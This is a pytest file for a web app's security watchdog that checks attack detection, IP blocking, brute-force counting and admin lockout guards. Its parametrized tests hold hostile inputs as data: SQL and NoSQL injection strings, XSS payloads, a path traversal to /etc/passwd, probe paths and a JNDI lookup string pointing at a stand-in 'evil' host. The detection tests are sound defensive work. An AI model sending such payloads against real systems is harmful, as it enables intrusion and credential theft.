"""Tests for the security watchdog (services/watchdog.py): detection, blocking, lockout guards."""

import asyncio
import json
import os
import sys
from datetime import datetime, timedelta, timezone

import pytest

sys.path.insert(0, os.path.dirname(__file__))
from services import watchdog as wd_mod  # noqa: E402
from services.watchdog import Watchdog, WatchdogMiddleware, scan_body, scan_request  # noqa: E402


# ---------------------------------------------------------------------------- tiny fake Mongo


class _Cursor:
    def __init__(self, rows):
        self.rows = rows

    def sort(self, field, direction=1):
        self.rows.sort(key=lambda r: str(r.get(field) or ""), reverse=direction == -1)
        return self

    def limit(self, n):
        self.rows = self.rows[:n]
        return self

    async def to_list(self, n):
        return self.rows[:n]


def _matches(doc, query):
    for key, cond in query.items():
        value = doc.get(key)
        if isinstance(cond, dict):
            for op, arg in cond.items():
                if op == "$gte" and not (value is not None and str(value) >= str(arg)):
                    return False
                if op == "$gt" and not (value is not None and str(value) > str(arg)):
                    return False
        elif value != cond:
            return False
    return True


class _Result:
    def __init__(self, deleted=0):
        self.deleted_count = deleted


class _Collection:
    def __init__(self, name):
        self.name = name
        self.docs = []

    async def create_index(self, *a, **k):
        return None

    def find(self, query=None, projection=None):
        return _Cursor([dict(d) for d in self.docs if _matches(d, query or {})])

    async def find_one(self, query, projection=None):
        for d in self.docs:
            if _matches(d, query):
                return dict(d)
        return None

    async def count_documents(self, query):
        return sum(1 for d in self.docs if _matches(d, query))

    async def update_one(self, query, update, upsert=False):
        doc = next((d for d in self.docs if _matches(d, query)), None)
        if doc is None:
            if not upsert:
                return _Result()
            doc = {k: v for k, v in query.items() if not isinstance(v, dict)}
            doc.update(update.get("$setOnInsert", {}))
            self.docs.append(doc)
        for k, v in update.get("$set", {}).items():
            if "." in k:
                head, tail = k.split(".", 1)
                doc.setdefault(head, {})[tail] = v
            else:
                doc[k] = v
        for k, v in update.get("$inc", {}).items():
            doc[k] = doc.get(k, 0) + v
        return _Result()

    async def delete_one(self, query):
        for i, d in enumerate(self.docs):
            if _matches(d, query):
                del self.docs[i]
                return _Result(1)
        return _Result(0)


class FakeDB(dict):
    def __missing__(self, name):
        coll = _Collection(name)
        self[name] = coll
        return coll


# ---------------------------------------------------------------------------- ASGI harness


async def _call(mw, *, method="GET", path="/api/x", query=b"", headers=None, body=b"", client="45.33.12.5"):
    hdrs = [(k.lower().encode(), v.encode()) for k, v in (headers or {}).items()]
    if body:
        hdrs.append((b"content-length", str(len(body)).encode()))
    scope = {"type": "http", "method": method, "path": path, "query_string": query,
             "headers": hdrs, "client": (client, 1234)}
    sent = [{"type": "http.request", "body": body, "more_body": False}]

    async def receive():
        return sent.pop(0) if sent else {"type": "http.disconnect"}

    out = []

    async def send(message):
        out.append(message)

    await mw(scope, receive, send)
    return out[0]["status"], b"".join(m.get("body", b"") for m in out if m["type"] == "http.response.body")


def _app(status=200):
    seen = {}

    async def app(scope, receive, send):
        msg = await receive()
        seen["body"] = msg.get("body", b"")
        await send({"type": "http.response.start", "status": status, "headers": []})
        await send({"type": "http.response.body", "body": b"ok"})

    return app, seen


def _rules(wd):
    return {p["rule"] for p in wd._pending.values()}


# ---------------------------------------------------------------------------- detection


@pytest.mark.parametrize("path,query,ua,rule", [
    ("/api/beats", "id=1%27%20UNION%20SELECT%20password%20FROM%20users--", "", "sql_injection"),
    ("/api/beats", "id=1' OR '1'='1", "", "sql_injection"),
    ("/api/search", "q=%3Cscript%3Ealert(1)%3C/script%3E", "", "xss"),
    ("/api/search", "q=%253Csvg%2520onload%253Dalert(1)%253E", "", "xss"),  # double-encoded
    ("/api/file", "name=../../etc/passwd", "", "path_traversal"),
    ("/api/login", "username[$ne]=x", "", "nosql_injection"),
    ("/.env", "", "", "probe"),
    ("/wp-login.php", "", "", "probe"),
    ("/.git/config", "", "", "probe"),
    ("/api/x", "", "sqlmap/1.7.2#stable", "scanner"),
    ("/api/x", "", "${jndi:ldap://evil/a}", "command_injection"),
])
def test_flags_attack_requests(path, query, ua, rule):
    hit = scan_request(path, query, ua)
    assert hit and hit[0] == rule


@pytest.mark.parametrize("path,query", [
    ("/api/tags/generate", "query=drake%20type%20beat"),
    ("/api/beats", "page=2&page_size=25&sort=-created_at"),
    ("/api/seo/trending", "artist=Lil+Uzi+Vert&genre=rage"),
    ("/api/youtube/upload", ""),
    ("/api/admin/users", "search=o%27brien"),
    ("/uploads/abc123/cover.png", ""),
])
def test_normal_requests_pass(path, query):
    assert scan_request(path, query, "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0) Expo/1") is None


def test_body_scan_finds_operators_and_payloads_but_skips_passwords():
    assert scan_body(b'{"username": {"$ne": null}, "password": "x"}', "application/json")[0] == "nosql_injection"
    assert scan_body(b'{"title": "<script>alert(1)</script>"}', "application/json")[0] == "xss"
    # A password field is never scanned (or stored).
    assert scan_body(b'{"username": "james", "password": "<script>1"}', "application/json") is None
    assert scan_body(b'{"description": "Dark trap beat... prod. by me (2026) and tags = fire"}', "application/json") is None
    assert scan_body(b"name=x&comment=1%27+UNION+SELECT+1--", "application/x-www-form-urlencoded")[0] == "sql_injection"


def test_client_ip_only_trusts_proxy_headers_from_proxy():
    assert wd_mod.client_ip_from("10.0.0.2", {"x-forwarded-for": "6.6.6.6, 81.2.69.7"}) == "81.2.69.7"
    assert wd_mod.client_ip_from("81.2.69.9", {"x-forwarded-for": "1.1.1.1"}) == "81.2.69.9"


# ---------------------------------------------------------------------------- middleware


def test_middleware_records_and_replays_body():
    wd = Watchdog()
    app, seen = _app()
    mw = WatchdogMiddleware(app, wd)
    body = json.dumps({"query": "1' UNION SELECT 1--"}).encode()
    status, _ = asyncio.run(_call(mw, method="POST", path="/api/tags/generate", body=body,
                                  headers={"content-type": "application/json"}))
    assert status == 200
    assert seen["body"] == body  # the app still gets the whole body
    assert _rules(wd) == {"sql_injection"}
    event = next(iter(wd._pending.values()))
    assert event["location"] == "body" and event["ip"] == "45.33.12.5"


def test_blocked_address_gets_403_but_admin_token_passes():
    wd = Watchdog(is_admin_token=lambda token: token == "admin-token")
    wd._set_blocklist([{"ip": "45.33.12.5"}])
    app, _ = _app()
    mw = WatchdogMiddleware(app, wd)
    status, body = asyncio.run(_call(mw))
    assert status == 403 and b"blocked" in body
    assert wd._block_hits == {"45.33.12.5": 1}
    status, _ = asyncio.run(_call(mw, headers={"authorization": "Bearer admin-token"}))
    assert status == 200
    status, _ = asyncio.run(_call(mw, client="81.2.69.1"))
    assert status == 200


def test_range_block_and_expiry():
    wd = Watchdog()
    past = (datetime.now(timezone.utc) - timedelta(hours=1)).isoformat()
    wd._set_blocklist([{"ip": "81.2.69.0/24"}, {"ip": "91.198.174.9", "expires_at": past}])
    assert wd.blocked_entry("81.2.69.77") == "81.2.69.0/24"
    assert wd.blocked_entry("91.198.174.9") is None


def test_blocking_switch_off_lets_everyone_through(monkeypatch):
    monkeypatch.setenv("WATCHDOG_BLOCKING_ENABLED", "false")
    wd = Watchdog()
    wd._set_blocklist([{"ip": "45.33.12.5"}])
    app, _ = _app()
    status, _ = asyncio.run(_call(WatchdogMiddleware(app, wd)))
    assert status == 200


def test_failed_logins_become_password_guessing(monkeypatch):
    monkeypatch.setenv("WATCHDOG_LOGIN_FAILS", "3")
    wd = Watchdog()
    app, _ = _app(status=401)
    mw = WatchdogMiddleware(app, wd)
    for _ in range(2):
        asyncio.run(_call(mw, method="POST", path="/api/auth/login"))
    assert "brute_force" not in _rules(wd)
    asyncio.run(_call(mw, method="POST", path="/api/auth/login"))
    assert "brute_force" in _rules(wd)


def test_non_admin_on_admin_endpoint_is_flagged():
    wd = Watchdog()
    app, _ = _app(status=403)
    asyncio.run(_call(WatchdogMiddleware(app, wd), path="/api/admin/users"))
    assert _rules(wd) == {"admin_probe"}


def test_repeat_hits_fold_into_one_event():
    wd = Watchdog()
    app, _ = _app()
    mw = WatchdogMiddleware(app, wd)
    for _ in range(5):
        asyncio.run(_call(mw, path="/.env"))
    assert len(wd._pending) == 1
    assert next(iter(wd._pending.values()))["count"] == 5


# ---------------------------------------------------------------------------- storage + admin guards


def test_flush_and_admin_views():
    db = FakeDB()
    wd = Watchdog()
    wd.db = db
    app, _ = _app()
    mw = WatchdogMiddleware(app, wd)
    asyncio.run(_call(mw, path="/.env"))
    asyncio.run(_call(mw, path="/.env"))
    asyncio.run(_call(mw, path="/api/x", query=b"q=<script>alert(1)</script>"))
    asyncio.run(wd.flush())
    events = asyncio.run(wd_mod.list_events(db, wd))
    assert len(events) == 2 and {e["rule"] for e in events} == {"probe", "xss"}
    ips = asyncio.run(wd_mod.list_ips(db, wd))
    assert ips[0]["ip"] == "45.33.12.5" and ips[0]["total"] == 3 and ips[0]["severity"] == "high"
    summary = asyncio.run(wd_mod.summary(db, wd, your_ip="81.2.69.1"))
    assert summary["unseen"] == 2 and summary["events_24h"] == 3 and summary["ips_24h"] == 1
    asyncio.run(wd_mod.mark_seen(db))
    assert asyncio.run(wd_mod.summary(db, wd, your_ip="x"))["unseen"] == 0


def _block(db, wd, target, admin_ip="81.2.69.1", hours=None):
    return asyncio.run(wd_mod.block(db, wd, target=target, reason="test", hours=hours,
                                    admin_ip=admin_ip, admin_name="deadat18"))


def test_block_guards_against_lockout(monkeypatch):
    monkeypatch.setenv("WATCHDOG_ALLOW_IPS", "91.198.174.50")
    db = FakeDB()
    wd = Watchdog()
    wd.db = db
    for target, message in [
        ("81.2.69.1", "your own address"),
        ("81.2.69.0/24", "your own address"),
        ("10.0.0.5", "private"),
        ("127.0.0.1", "private"),
        ("45.0.0.0/8", "too wide"),
        ("91.198.174.50", "allow list"),
        ("not-an-ip", "valid"),
    ]:
        with pytest.raises(ValueError, match=message):
            _block(db, wd, target)
    asyncio.run(wd_mod.note_admin_ip(db, "45.33.12.200"))
    with pytest.raises(ValueError, match="admin account"):
        _block(db, wd, "45.33.12.200")


def test_block_then_unblock():
    db = FakeDB()
    wd = Watchdog()
    wd.db = db
    entry = _block(db, wd, "45.33.12.5", hours=24)
    assert entry["ip"] == "45.33.12.5" and entry["expires_at"]
    assert wd.blocked_entry("45.33.12.5") == "45.33.12.5"
    assert [b["ip"] for b in asyncio.run(wd_mod.list_blocklist(db))] == ["45.33.12.5"]
    assert asyncio.run(wd_mod.unblock(db, wd, target="45.33.12.5")) is True
    assert wd.blocked_entry("45.33.12.5") is None
